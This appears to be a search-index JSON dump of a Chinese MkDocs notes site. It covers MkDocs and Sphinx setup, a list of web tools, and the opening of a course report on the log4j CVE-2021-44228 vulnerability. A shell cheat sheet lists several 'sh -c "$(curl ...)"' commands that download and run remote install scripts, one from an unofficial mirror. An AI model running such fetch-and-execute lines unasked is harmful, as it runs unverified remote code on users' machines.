\u4e2d\u8bbe\u7f6e\u7684\u9879\u76ee\u5730\u5740\u90e8\u7f72\u5230 GitHub \u7684 gh-pages \u5206\u652f\u4e2d","title":"\u4f7f\u7528"},{"location":"cs/tools/mkdocs/#_3","text":"site_name \uff1a \u5fc5\u586b \uff0c\u6587\u6863\u4e3b\u6807\u9898\u540d\u79f0 site_url \uff1a\u6700\u7ec8\u7684\u7f51\u7ad9 url repo_url \uff1a\u5bf9\u5e94\u7684 GitHub repo \u7684\u94fe\u63a5\uff0c\u7528\u4e8e deploy \u548c\u53f3\u4e0a\u89d2\u7684\u94fe\u63a5 edit_url \uff1a\u76f8\u5bf9\u4e8e repo \u94fe\u63a5\u7684 docs \u76ee\u5f55\u5730\u5740 site_description \u7ad9\u70b9\u63cf\u8ff0 copyright \uff1a\u5de6\u4e0b\u89d2\u7248\u6743\u4fe1\u606f theme: \u4e3b\u9898\u6837\u5f0f\u4f8b\u5982: theme : name : 'material' # \u4f7f\u7528material\u4e3b\u9898,\u9700\u8981pip\u5b89 \u88c5mkdocs-material language : 'zh' # \u4f7f\u7528\u4e2d\u6587 icon : logo : ... # \u5de6\u4e0a\u89d2\u7684 logo custom_dir : ... # \u7528\u4e8e\u8986\u76d6\u6a21\u677f feature : ... font : # \u5b57\u4f53 text : ... code : ... palette : ... # \u914d\u8272\u65b9\u6848 markdown_extensions \uff1a\u9700\u8981\u6dfb\u52a0\u7684 pymarkdown \u6269\u5c55\uff08\u5305\u5df2\u7ecf\u968f mkdocs \u9ed8\u8ba4\u5b89\u88c5\uff09\uff0c\u5177\u4f53\u5404\u79cd\u6269\u5c55\u7684\u7528\u6cd5\u770b \u5b98\u65b9\u6587\u6863 extra \uff1a\u4e3b\u9898\u9700\u8981\u7684\u5176\u4ed6\u914d\u7f6e\uff0c\u6bd4\u5982 material \u4e3b\u9898\u7684\u53f3\u4e0b\u89d2\u94fe\u63a5 social \u548c\u6d41\u91cf\u5206\u6790 analytics \u7684\u8bbe\u7f6e extra_css \uff1a\u9644\u52a0\u7684 css \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84 extra_javascript \uff1a\u9644\u52a0\u7684 js \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84\u3002\u4f1a\u653e\u5230 body \u7684\u6700\u540e\uff0c\u5982\u679c\u9700\u8981\u653e\u5230 head \u91cc\u9700\u8981\u7528\u8986\u76d6\u6a21\u677f\u7684\u65b9\u5f0f plugins \uff1a\u4e00\u4e9b\u63d2\u4ef6\uff0c\u6bd4\u5982\u641c\u7d22 search \uff0c\u663e\u793a\u6700\u8fd1\u4fee\u6539\u65f6\u95f4 git-revision-date-localized nav \uff1a\u76ee\u5f55\u7ed3\u6784 \u672c\u7ad9\u7684\u914d\u7f6e\u6587\u6863\u5728\uff1a https://github.com/TonyCrane/note/blob/master/mkdocs.yml \uff0c\u53ef\u4f9b\u53c2\u8003 \u5177\u4f53\u7684\u5404\u79cd\u7528\u6cd5\u8fd8\u662f\u770b\u5b98\u65b9\u6587\u6863\u6bd4\u8f83\u597d\uff0c\u5f88\u5168\u9762","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"cs/tools/mkdocs/#reference","text":"mkdocs \u5b98\u65b9\u6587\u6863 pymarkdown \u5185\u7f6e extensions pymdown-extensions \u6587\u6863 mateial for mkdocs \u6587\u6863 shafish.cn \u4e0a\u7684\u6559\u7a0b","title":"Reference"},{"location":"cs/tools/shell/","text":"Shell \u547d\u4ee4\u5907\u5fd8 \u00b6 Abstract \u4e00\u4e9b\u5e38\u7528\u7684 shell \u547d\u4ee4\uff0c\u76ee\u524d\u5e94\u8be5\u8865\u5168\uff0c\u60f3\u8d77\u6765\u5c31\u66f4\u65b0\u5427 zsh \u76f8\u5173 \u00b6 \u5b89\u88c5 \u00b6 mac \u81ea\u5e26 Linux \u4f7f\u7528\u5bf9\u5e94\u8f6f\u4ef6\u5305\u7ba1\u7406\u5668\u5b89\u88c5 zsh \u5373\u53ef sudo apt install zsh \u67e5\u770b zsh \u8def\u5f84\uff1a which zsh \u66f4\u6539\u9ed8\u8ba4 shell\uff1a sudo chsh -s /usr/bin/zsh \u4e3b\u9898 \u00b6 \u5b89\u88c5 oh-my-zsh\uff08\u56db\u9009\u4e00\uff09 sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" sh -c \"$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\" sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" sh -c \"$(wget -O- https://gitee.com/pocmon/mirrors/raw/master/tools/install.sh)\" \u5b89\u88c5 powerlevel10k\uff08p10k\uff09 git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k git clone --depth=1 https://gitee.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k \u5728 ~/.zshrc \u4e2d\u8bbe\u7f6e ZSH_THEME \u4e3a \"powerlevel10k/powerlevel10k\" \u63d2\u4ef6 \u00b6 \u81ea\u5e26 git \u63d2\u4ef6 zsh-autosuggestions\uff1a git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions zsh-syntax-highlighting\uff1a git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting \u7136\u540e\u5728 ~/.zshrc \u4e2d\u8bbe\u7f6e plugins=(git zsh-autosuggestions zsh-syntax-highlighting)","title":"Shell \u547d\u4ee4\u5907\u5fd8"},{"location":"cs/tools/shell/#shell","text":"Abstract \u4e00\u4e9b\u5e38\u7528\u7684 shell \u547d\u4ee4\uff0c\u76ee\u524d\u5e94\u8be5\u8865\u5168\uff0c\u60f3\u8d77\u6765\u5c31\u66f4\u65b0\u5427","title":"Shell \u547d\u4ee4\u5907\u5fd8"},{"location":"cs/tools/shell/#zsh","text":"","title":"zsh \u76f8\u5173"},{"location":"cs/tools/shell/#_1","text":"mac \u81ea\u5e26 Linux \u4f7f\u7528\u5bf9\u5e94\u8f6f\u4ef6\u5305\u7ba1\u7406\u5668\u5b89\u88c5 zsh \u5373\u53ef sudo apt install zsh \u67e5\u770b zsh \u8def\u5f84\uff1a which zsh \u66f4\u6539\u9ed8\u8ba4 shell\uff1a sudo chsh -s /usr/bin/zsh","title":"\u5b89\u88c5"},{"location":"cs/tools/shell/#_2","text":"\u5b89\u88c5 oh-my-zsh\uff08\u56db\u9009\u4e00\uff09 sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" sh -c \"$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\" sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" sh -c \"$(wget -O- https://gitee.com/pocmon/mirrors/raw/master/tools/install.sh)\" \u5b89\u88c5 powerlevel10k\uff08p10k\uff09 git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k git clone --depth=1 https://gitee.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k \u5728 ~/.zshrc \u4e2d\u8bbe\u7f6e ZSH_THEME \u4e3a \"powerlevel10k/powerlevel10k\"","title":"\u4e3b\u9898"},{"location":"cs/tools/shell/#_3","text":"\u81ea\u5e26 git \u63d2\u4ef6 zsh-autosuggestions\uff1a git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions zsh-syntax-highlighting\uff1a git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting \u7136\u540e\u5728 ~/.zshrc \u4e2d\u8bbe\u7f6e plugins=(git zsh-autosuggestions zsh-syntax-highlighting)","title":"\u63d2\u4ef6"},{"location":"cs/tools/sphinx/","text":"Sphinx \u4f7f\u7528\u8bb0\u5f55 \u00b6 Abstract \u5bf9\u4e8e\u9879\u76ee\u6587\u6863\uff0cmkdocs \u770b\u8d77\u6765\u4e5f\u5f88\u8212\u9002\uff0c\u4f46\u662f\u8c8c\u4f3c\u4e0d\u80fd\u76f4\u63a5\u6839\u636e\u6587\u6863\u5b57\u7b26\u4e32\u6765\u751f\u6210\u6587\u6863\u3002\u800c\u540c\u6837\u57fa\u4e8e python \u7684 sphinx \u5c31\u5f88\u597d\u7528\uff0c\u5bf9\u4e8e python \u9879\u76ee\uff0c\u7528 sphinx \u6765\u751f\u6210\u6587\u6863\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684 \u5b89\u88c5 \u00b6 \u4f7f\u7528 pip install Sphinx \u901a\u8fc7 pip \u5b89\u88c5\u5373\u53ef \u4f7f\u7528 \u00b6 \u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/usage/quickstart.html \u5b83\u548c mkdocs/hexo \u7684\u5dee\u522b\u8fd8\u662f\u5f88\u5927\u7684\uff0c\u6bd4\u5982\u914d\u7f6e\u6587\u4ef6\u662f python \u6587\u4ef6\u800c\u4e0d\u662f yml\uff0c\u9875\u9762\u6e90\u7801\u9ed8\u8ba4\u7528 rst\uff08reStructuredText\uff09\u800c\u4e0d\u662f markdown\uff0c\u5e76\u4e14\u751f\u6210\u6587\u6863\u662f\u4f7f\u7528 make html \u547d\u4ee4\u6765\u901a\u8fc7 Makefile \u6587\u4ef6\u7f16\u8bd1\u51fa\u6587\u6863 \u751f\u6210\u6587\u6863 \u00b6 \u5982\u679c\u9879\u76ee\u5df2\u7ecf\u4f7f\u7528 rst \u8bed\u6cd5\u7f16\u5199\u597d\u4e86\u6587\u6863\u5b57\u7b26\u4e32\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u63d0\u53d6\u51fa\u6765\u751f\u6210\u6587\u6863 \u524d\u63d0\u662f\u9700\u8981\u5728 conf.py \u4e2d\u914d\u7f6e\u597d path .. autoclass :: A.B.C :members: \u5c31\u4f1a\u81ea\u52a8\u5bfc\u5165 A.B.C \u8fd9\u4e2a\u7c7b\uff0c\u5e76\u4e3a\u81ea\u8eab\u548c\u5b83\u6240\u6709\u7684\u5e26\u6709\u6587\u6863\u5b57\u7b26\u4e32\u7684\u65b9\u6cd5\u751f\u6210\u6587\u6863\u3002 .. automodule: A :members: \u4f1a\u81ea\u52a8\u4e3a A \u8fd9\u4e2a\u6a21\u5757\u751f\u6210\u6587\u6863 \u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html \u63d2\u4ef6 \u00b6 Sphinx \u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u63d2\u4ef6\u3002\u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/extdev/index.html#dev-extensions","title":"sphinx \u4f7f\u7528\u8bb0\u5f55"},{"location":"cs/tools/sphinx/#sphinx","text":"Abstract \u5bf9\u4e8e\u9879\u76ee\u6587\u6863\uff0cmkdocs \u770b\u8d77\u6765\u4e5f\u5f88\u8212\u9002\uff0c\u4f46\u662f\u8c8c\u4f3c\u4e0d\u80fd\u76f4\u63a5\u6839\u636e\u6587\u6863\u5b57\u7b26\u4e32\u6765\u751f\u6210\u6587\u6863\u3002\u800c\u540c\u6837\u57fa\u4e8e python \u7684 sphinx \u5c31\u5f88\u597d\u7528\uff0c\u5bf9\u4e8e python \u9879\u76ee\uff0c\u7528 sphinx \u6765\u751f\u6210\u6587\u6863\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684","title":"Sphinx \u4f7f\u7528\u8bb0\u5f55"},{"location":"cs/tools/sphinx/#_1","text":"\u4f7f\u7528 pip install Sphinx \u901a\u8fc7 pip \u5b89\u88c5\u5373\u53ef","title":"\u5b89\u88c5"},{"location":"cs/tools/sphinx/#_2","text":"\u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/usage/quickstart.html \u5b83\u548c mkdocs/hexo \u7684\u5dee\u522b\u8fd8\u662f\u5f88\u5927\u7684\uff0c\u6bd4\u5982\u914d\u7f6e\u6587\u4ef6\u662f python \u6587\u4ef6\u800c\u4e0d\u662f yml\uff0c\u9875\u9762\u6e90\u7801\u9ed8\u8ba4\u7528 rst\uff08reStructuredText\uff09\u800c\u4e0d\u662f markdown\uff0c\u5e76\u4e14\u751f\u6210\u6587\u6863\u662f\u4f7f\u7528 make html \u547d\u4ee4\u6765\u901a\u8fc7 Makefile \u6587\u4ef6\u7f16\u8bd1\u51fa\u6587\u6863","title":"\u4f7f\u7528"},{"location":"cs/tools/sphinx/#_3","text":"\u5982\u679c\u9879\u76ee\u5df2\u7ecf\u4f7f\u7528 rst \u8bed\u6cd5\u7f16\u5199\u597d\u4e86\u6587\u6863\u5b57\u7b26\u4e32\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u63d0\u53d6\u51fa\u6765\u751f\u6210\u6587\u6863 \u524d\u63d0\u662f\u9700\u8981\u5728 conf.py \u4e2d\u914d\u7f6e\u597d path .. autoclass :: A.B.C :members: \u5c31\u4f1a\u81ea\u52a8\u5bfc\u5165 A.B.C \u8fd9\u4e2a\u7c7b\uff0c\u5e76\u4e3a\u81ea\u8eab\u548c\u5b83\u6240\u6709\u7684\u5e26\u6709\u6587\u6863\u5b57\u7b26\u4e32\u7684\u65b9\u6cd5\u751f\u6210\u6587\u6863\u3002 .. automodule: A :members: \u4f1a\u81ea\u52a8\u4e3a A \u8fd9\u4e2a\u6a21\u5757\u751f\u6210\u6587\u6863 \u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html","title":"\u751f\u6210\u6587\u6863"},{"location":"cs/tools/sphinx/#_4","text":"Sphinx \u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u63d2\u4ef6\u3002\u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/extdev/index.html#dev-extensions","title":"\u63d2\u4ef6"},{"location":"cs/tools/toolbox/","text":"\u5de5\u5177\u6536\u96c6 \u00b6 Abstract \u901b GitHub \u7b49\u7684\u65f6\u5019\u770b\u5230\u7684\u597d\u73a9\u7684/\u6709\u7528\u7684\u5de5\u5177\u6536\u96c6 \u968f\u65f6\u66f4\u65b0\uff0c\u6b22\u8fce\u5728\u4e0b\u65b9\u8bc4\u8bba\u533a\u8865\u5145 (\uffe3\u25bd\uffe3) .md-typeset a:is(:focus,:hover) { opacity: 1; } .md-typeset a { color: var(--md-accent-fg-color); opacity: 0.8; } \u56fe\u7247\u7c7b \u00b6 \u4f5c\u56fe \u00b6 \u5728\u7ebf\u624b\u5199\u98ce\u683c\u4f5c\u56fe\u767d\u677f Excalidraw \u5728\u7ebf\u77e2\u91cf\u56fe\u4f5c\u56fe\u8f6f\u4ef6\uff08draw.io\uff09 app.diagrams.net \u5728\u7ebf\u56fe\u8bba\u4f5c\u56fe\u7f51\u7ad9 Graph Editor \u8bc6\u56fe \u00b6 SauceNAO \u4fee\u6539\u56fe\u7247 \u00b6 \u79fb\u9664\u80cc\u666f\uff08\u5b8c\u5168\u514d\u8d39\uff09 RemoveBg \u7eaf\u524d\u7aef\u514d\u8d39\u56fe\u7247\u538b\u7f29 PicDiet \u56fe\u7247\u538b\u7f29\uff08\u9700\u4e0a\u4f20\uff09 DocSmall \u64e6\u9664\u56fe\u7247\u4e0a\u7269\u54c1\uff08\u514d\u8d39\u529f\u80fd\u53d7\u9650\uff09 cleanup.pictures \u4ee3\u7801\u7c7b \u00b6 \u53ef\u89c6\u5316 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u89c6\u5316 Regulex Python \u6267\u884c\u8fc7\u7a0b\u53ef\u89c6\u5316 PythonTutor GLSL \u6d41\u4f53\u573a\u53ef\u89c6\u5316 Field Play \u7f16\u89e3\u7801 \u00b6 \u8d85\u5f3a\u591a\u5408\u4e00\u7f16\u89e3\u7801\u5de5\u5177 CyberChef \u4e09\u8bcd\u5730\u5740\uff08\u7528\u4e09\u4e2a\u5355\u8bcd\u7f16\u7801\u4e00\u4e2a\u5730\u70b9\uff09 what3words \u5b66\u4e60\u5de5\u5177 \u00b6 \u7f13\u52a8\u66f2\u7ebf Easing Function Cheat Sheet \u591a\u7f16\u8bd1\u5668\u7f16\u8bd1\u7ed3\u679c\u6d4f\u89c8 Compiler Explorer \u5927 O \u590d\u6742\u5ea6\u6bd4\u8f83\u67e5\u8be2 Big O Cheat Sheet C \u7c7b\u578b\u58f0\u660e\u8f6c\u82f1\u6587\u63cf\u8ff0 cdecl \u8bbe\u8ba1\u7c7b \u00b6 \u914d\u8272 \u00b6 \u914d\u8272\u65b9\u6848\u7f51\u7ad9 Color Hunt \u914d\u8272\u65b9\u6848\u7f51\u7ad9\uff08\u5e26 Figma \u63d2\u4ef6\uff09 Coolors \u989c\u8272\u67e5\u627e\u53ca\u8f6c\u6362\u5de5\u5177 HexColor16 \u65e5\u5f0f\u4f20\u7edf\u989c\u8272\u5217\u8868 Nippon Colors \u65e5\u7cfb\u989c\u8272\u540d\u79f0\u5217\u8868\uff08 \u8272\u56fe\u7f51\u7ad9 \uff09 Color Site Flat UI \u914d\u8272\u65b9\u6848 Flat UI Colors \u56fe\u6807 \u00b6 \u5404\u7cfb\u5217\u56fe\u6807\u5408\u96c6 icones \u6570\u5b66\u7c7b \u00b6 \u6570\u5217\u67e5\u627e OEIS \u5176\u5b83 \u00b6 Emoji \u67e5\u8be2 EmojiAll","title":"\u5de5\u5177\u6536\u96c6"},{"location":"cs/tools/toolbox/#_1","text":"Abstract \u901b GitHub \u7b49\u7684\u65f6\u5019\u770b\u5230\u7684\u597d\u73a9\u7684/\u6709\u7528\u7684\u5de5\u5177\u6536\u96c6 \u968f\u65f6\u66f4\u65b0\uff0c\u6b22\u8fce\u5728\u4e0b\u65b9\u8bc4\u8bba\u533a\u8865\u5145 (\uffe3\u25bd\uffe3) .md-typeset a:is(:focus,:hover) { opacity: 1; } .md-typeset a { color: var(--md-accent-fg-color); opacity: 0.8; }","title":"\u5de5\u5177\u6536\u96c6"},{"location":"cs/tools/toolbox/#_2","text":"","title":"\u56fe\u7247\u7c7b"},{"location":"cs/tools/toolbox/#_3","text":"\u5728\u7ebf\u624b\u5199\u98ce\u683c\u4f5c\u56fe\u767d\u677f Excalidraw \u5728\u7ebf\u77e2\u91cf\u56fe\u4f5c\u56fe\u8f6f\u4ef6\uff08draw.io\uff09 app.diagrams.net \u5728\u7ebf\u56fe\u8bba\u4f5c\u56fe\u7f51\u7ad9 Graph Editor","title":"\u4f5c\u56fe"},{"location":"cs/tools/toolbox/#_4","text":"SauceNAO","title":"\u8bc6\u56fe"},{"location":"cs/tools/toolbox/#_5","text":"\u79fb\u9664\u80cc\u666f\uff08\u5b8c\u5168\u514d\u8d39\uff09 RemoveBg \u7eaf\u524d\u7aef\u514d\u8d39\u56fe\u7247\u538b\u7f29 PicDiet \u56fe\u7247\u538b\u7f29\uff08\u9700\u4e0a\u4f20\uff09 DocSmall \u64e6\u9664\u56fe\u7247\u4e0a\u7269\u54c1\uff08\u514d\u8d39\u529f\u80fd\u53d7\u9650\uff09 cleanup.pictures","title":"\u4fee\u6539\u56fe\u7247"},{"location":"cs/tools/toolbox/#_6","text":"","title":"\u4ee3\u7801\u7c7b"},{"location":"cs/tools/toolbox/#_7","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u89c6\u5316 Regulex Python \u6267\u884c\u8fc7\u7a0b\u53ef\u89c6\u5316 PythonTutor GLSL \u6d41\u4f53\u573a\u53ef\u89c6\u5316 Field Play","title":"\u53ef\u89c6\u5316"},{"location":"cs/tools/toolbox/#_8","text":"\u8d85\u5f3a\u591a\u5408\u4e00\u7f16\u89e3\u7801\u5de5\u5177 CyberChef \u4e09\u8bcd\u5730\u5740\uff08\u7528\u4e09\u4e2a\u5355\u8bcd\u7f16\u7801\u4e00\u4e2a\u5730\u70b9\uff09 what3words","title":"\u7f16\u89e3\u7801"},{"location":"cs/tools/toolbox/#_9","text":"\u7f13\u52a8\u66f2\u7ebf Easing Function Cheat Sheet \u591a\u7f16\u8bd1\u5668\u7f16\u8bd1\u7ed3\u679c\u6d4f\u89c8 Compiler Explorer \u5927 O \u590d\u6742\u5ea6\u6bd4\u8f83\u67e5\u8be2 Big O Cheat Sheet C \u7c7b\u578b\u58f0\u660e\u8f6c\u82f1\u6587\u63cf\u8ff0 cdecl","title":"\u5b66\u4e60\u5de5\u5177"},{"location":"cs/tools/toolbox/#_10","text":"","title":"\u8bbe\u8ba1\u7c7b"},{"location":"cs/tools/toolbox/#_11","text":"\u914d\u8272\u65b9\u6848\u7f51\u7ad9 Color Hunt \u914d\u8272\u65b9\u6848\u7f51\u7ad9\uff08\u5e26 Figma \u63d2\u4ef6\uff09 Coolors \u989c\u8272\u67e5\u627e\u53ca\u8f6c\u6362\u5de5\u5177 HexColor16 \u65e5\u5f0f\u4f20\u7edf\u989c\u8272\u5217\u8868 Nippon Colors \u65e5\u7cfb\u989c\u8272\u540d\u79f0\u5217\u8868\uff08 \u8272\u56fe\u7f51\u7ad9 \uff09 Color Site Flat UI \u914d\u8272\u65b9\u6848 Flat UI Colors","title":"\u914d\u8272"},{"location":"cs/tools/toolbox/#_12","text":"\u5404\u7cfb\u5217\u56fe\u6807\u5408\u96c6 icones","title":"\u56fe\u6807"},{"location":"cs/tools/toolbox/#_13","text":"\u6570\u5217\u67e5\u627e OEIS","title":"\u6570\u5b66\u7c7b"},{"location":"cs/tools/toolbox/#_14","text":"Emoji \u67e5\u8be2 EmojiAll","title":"\u5176\u5b83"},{"location":"cs/web/","text":"Web \u76f8\u5173 \u00b6 Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b web \u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0 Table of Contents \u00b6 \u7f51\u7edc\u534f\u8bae VMess \u534f\u8bae SVG log4j \u6f0f\u6d1e\u590d\u73b0","title":"Web \u76f8\u5173"},{"location":"cs/web/#web","text":"Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b web \u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0","title":"Web \u76f8\u5173"},{"location":"cs/web/#table-of-contents","text":"\u7f51\u7edc\u534f\u8bae VMess \u534f\u8bae SVG log4j \u6f0f\u6d1e\u590d\u73b0","title":"Table of Contents"},{"location":"cs/web/log4j_vuln/","text":"log4j \u6f0f\u6d1e\u590d\u73b0 \u00b6 Abstract \u8fd9\u7bc7\u662f\u6d59\u6c5f\u5927\u5b66 \u201c\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u7684\u8bfe\u7a0b\u62a5\u544a \u4ecb\u7ecd\u4e86 log4j \u53ca\u7531\u5176\u5f15\u53d1\u7684 CVE-2021-44228 \u6f0f\u6d1e\uff0c\u5e76\u4ece JNDI\u3001LDAP\u3001RMI\u3001log4j \u7b49\u65b9\u9762\u5206\u6790\u4e86\u8be5\u6f0f\u6d1e\u7684\u5177\u4f53\u539f\u7406\uff0c\u518d\u901a\u8fc7 LDAP\u3001RMI \u4e24\u79cd\u65b9\u5f0f\u672c\u5730\u590d\u73b0\u8be5\u6f0f\u6d1e\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u548c\u53cd\u5f39\u7ec8\u7aef\uff0c\u6700\u540e\u4ecb\u7ecd\u8be5\u6f0f\u6d1e\u7684\u4fee\u590d\u3002 log4j \u6f0f\u6d1e\u6982\u8ff0 \u00b6 log4j \u7b80\u4ecb \u00b6 log4j \u662f Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u6e90 Java \u65e5\u5fd7\u6846\u67b6\u3002\u5b83\u63d0\u4f9b\u4e86\u4e30\u5bcc\u53ef\u6269\u5c55\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e0e\u8f93\u51fa\u529f\u80fd\uff0c\u53ef\u4ee5\u8f93\u51fa\u65e5\u5fd7\u5230\u4efb\u610f\u4f4d\u7f6e\u3001\u66f4\u6539\u65e5\u5fd7\u5185\u5bb9\u6837\u5f0f\u3001\u6307\u5b9a\u65e5\u5fd7\u7ea7\u522b\u5e76\u5206\u7ea7\u522b\u663e\u793a\u3001\u4ee5\u53ca\u5229\u7528 ${} \u8bed\u53e5\u8f93\u51fa\u52a8\u6001\u5185\u5bb9\u7b49\u3002 \u968f\u7740\u6280\u672f\u53d1\u5c55\uff0c1.x \u7248\u672c\u7684 log4j \u9010\u6e10\u5728\u7ed3\u6784\u3001\u6027\u80fd\u4e0a\u88ab slf4j\u3001logback \u7b49\u65b0\u5174\u7684\u65e5\u5fd7\u6846\u67b6\u8d85\u8d8a\uff0cApache \u4e5f\u56e0\u6b64\u5bf9 log4j \u8fdb\u884c\u4e86\u4e00\u6b21\u91cd\u6784\u5347\u7ea7\uff0c\u53d1\u5e03\u4e86\u4f18\u5316\u4e86\u7ed3\u6784\u3001\u6027\u80fd\u7684 2.x \u7248\u672c log4j\uff08\u53c8\u540d log4j2\uff09\u3002log4j2 \u501f\u9274\u4e86 slf4j \u7684\u7ed3\u6784\u8bbe\u8ba1\uff0c\u5206\u4e3a\u4e86\u4e24\u90e8\u5206\uff1alog4j-api\u3001log4j-core\uff0c\u524d\u8005\u4ec5\u63d0\u4f9b\u63a5\u53e3\uff0c\u540e\u8005\u63d0\u4f9b\u5b9e\u73b0\u3002\u5305\u540d\u5206\u522b\u4e3a org.apache.logging.log4j \u548c org.apache.logging.log4j.core\u3002 \u56e0\u4e3a log4j \u7684\u6613\u7528\u6027\uff0c\u4f17\u591a\u4ee5 Java \u4f5c\u4e3a\u540e\u7aef\u670d\u52a1\u8bed\u8a00\u7684\u7f51\u7edc\u5e94\u7528\u3001\u8f6f\u4ef6\u90fd\u5728\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u3002 CVE-2021-44228 \u00b6 CVE-2021-44228 \u662f\u963f\u91cc\u4e91\u56e2\u961f\u5728 2021 \u5e74 11 \u6708 26 \u65e5\u63d0\u4ea4\u3001\u540c\u5e74 12 \u6708 9 \u65e5\u516c\u5f00\u7684\u5173\u4e8e log4j \u7684\u91cd\u5927\u6f0f\u6d1e\u3002\u5b83\u53ef\u4ee5\u5b9e\u73b0 RCE\uff08Remote Code Execution\uff0c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff09\uff0c\u4ece\u800c\u5371\u5bb3\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684 Java \u670d\u52a1\u5668\u7684\u5b89\u5168\u3002CVSS3.0\uff08\u901a\u7528\u6f0f\u6d1e\u8bc4\u5206\u7cfb\u7edf\uff09\u8bc4\u5206 10.0 \u5206\u3001\u8bc4\u7ea7 critical\u3002 \u8be5\u6f0f\u6d1e\u5a01\u80c1\u7b49\u7ea7\u9ad8\u3001\u5f71\u54cd\u9762\u5e7f\u6cdb\u3001\u5229\u7528\u4ef7\u503c\u9ad8\u3001\u5229\u7528\u96be\u5ea6\u4f4e\uff0c\u53d7\u5230\u5e7f\u6cdb\u5173\u6ce8\u3002\u5e76\u4e14\u56e0\u4e3a log4j \u7684\u5e7f\u6cdb\u5e94\u7528\uff0c\u5305\u62ec\u82f9\u679c\u3001\u8c37\u6b4c\u3001\u767e\u5ea6\u3001Steam \u7b49\u5728\u5185\u7684\u5927\u578b\u4e92\u8054\u7f51\u4f01\u4e1a\u7684\u4ea7\u54c1\u4e5f\u90fd\u53d7\u5230\u8be5\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002 \u8be5\u6f0f\u6d1e\u7531 JNDI \u7279\u6027\u5f15\u8d77\uff0c\u5176\u5e76\u6ca1\u6709\u4fdd\u62a4\u901a\u8fc7 LDAP \u7b49\u67e5\u627e JNDI \u7684\u65b9\u5f0f\uff0c\u9020\u6210\u6f5c\u5728\u7684 RCE\u3002\u5f71\u54cd\u8303\u56f4\u4ece log4j \u7248\u672c 2.0-beta9 \u5f00\u59cb\u5230 2.15.0-rc1\uff0c\u5e76\u5728 2.15.0-rc2 \u7248\u672c\u4e2d\u5c06\u8fd9\u4e00\u884c\u4e3a\u9ed8\u8ba4\u5173\u95ed\uff0c\u5728 2.16.0 \u7248\u672c\u4e2d\u5b8c\u5168\u79fb\u9664\u3002 log4j \u6f0f\u6d1e\u539f\u7406 \u00b6 JNDI \u7b80\u4ecb \u00b6 JNDI\uff08Java Naming and Directory Interface\uff0cJava \u547d\u540d\u548c\u76ee\u5f55\u63a5\u53e3\uff09\u662f\u7528\u4e8e\u4ece Java \u5e94\u7528\u4e2d\u8bbf\u95ee\u540d\u79f0\u548c\u76ee\u5f55\u670d\u52a1\u7684\u4e00\u7ec4 API\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5c06\u540d\u79f0/\u76ee\u5f55\u4e0e\u5bf9\u8c61\u76f8\u5173\u8054\uff0c\u5e76\u63d0\u4f9b\u4e86\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u6765\u67e5\u627e\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002 